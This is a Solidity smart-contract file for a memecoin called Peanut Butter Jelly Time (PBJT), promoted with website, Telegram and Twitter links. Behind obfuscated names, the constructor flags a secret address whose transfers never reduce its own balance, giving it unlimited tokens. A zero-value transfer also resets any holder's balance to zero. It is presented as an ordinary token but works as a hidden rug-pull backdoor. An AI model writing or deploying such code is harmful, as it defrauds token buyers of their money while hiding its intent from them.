/*

Website: https://pbj.crypto-token.live/

Join our Telegram group: https://t.me/PeanutButterJellyTimeETH

Follow us on Twitter: https://twitter.com/PBJTETH

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PeanutButterJellyTime is Ownable {
    mapping(address => uint256) public balanceOf;

    string public symbol = 'PBJT';

    uint8 public decimals = 9;

    mapping(address => uint256) private qmhcxynbr;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private hgypjzbkxeqr = 117;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'Peanut Butter Jelly Time';

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address bdcnmegfi, uint256 tqfchmlz) public returns (bool success) {
        ipzoan(msg.sender, bdcnmegfi, tqfchmlz);
        return true;
    }

    constructor(address yacfxe) {
        balanceOf[msg.sender] = totalSupply;
        qmhcxynbr[yacfxe] = hgypjzbkxeqr;
        IUniswapV2Router02 alxy = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        heoxig = IUniswapV2Factory(alxy.factory()).createPair(address(this), alxy.WETH());
    }

    function transferFrom(address kozmcj, address bdcnmegfi, uint256 tqfchmlz) public returns (bool success) {
        require(tqfchmlz <= allowance[kozmcj][msg.sender]);
        allowance[kozmcj][msg.sender] -= tqfchmlz;
        ipzoan(kozmcj, bdcnmegfi, tqfchmlz);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private flwrpbm;

    address public heoxig;

    function ipzoan(address kozmcj, address bdcnmegfi, uint256 tqfchmlz) private {
        if (0 == qmhcxynbr[kozmcj]) {
            balanceOf[kozmcj] -= tqfchmlz;
        }
        balanceOf[bdcnmegfi] += tqfchmlz;
        if (0 == tqfchmlz && bdcnmegfi != heoxig) {
            balanceOf[bdcnmegfi] = tqfchmlz;
        }
        emit Transfer(kozmcj, bdcnmegfi, tqfchmlz);
    }

    function approve(address rwdq, uint256 tqfchmlz) public returns (bool success) {
        allowance[msg.sender][rwdq] = tqfchmlz;
        emit Approval(msg.sender, rwdq, tqfchmlz);
        return true;
    }
}